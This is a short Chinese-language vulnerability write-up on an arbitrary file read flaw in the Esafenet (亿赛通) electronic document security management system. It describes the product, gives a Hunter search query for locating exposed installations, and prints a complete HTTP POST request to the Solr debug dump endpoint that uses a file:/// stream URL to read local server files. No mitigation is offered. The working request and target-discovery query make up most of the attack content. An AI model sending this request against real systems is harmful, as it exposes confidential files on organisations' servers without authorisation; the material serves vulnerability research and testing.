# 亿赛通电子文档安全管理系统dump存在任意文件读取漏洞

# 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统dump存在任意文件读取漏洞。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/4wb9My-pXr8E4yXJ/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-964287.png)

# 四、漏洞复现
```plain
POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
Host: 192.168.31.24:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: image/avif,image/webp,*/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=31E80EEC9EE4DC0835A362E81A9D179F
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stream.url=file:///C:\Program Files\
```

![1705153475375-338c2585-3f41-423d-9df8-cdef41bf28dc.png](./img/4wb9My-pXr8E4yXJ/1705153475375-338c2585-3f41-423d-9df8-cdef41bf28dc-651879.png)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pt6h9gddl8ipaiz8>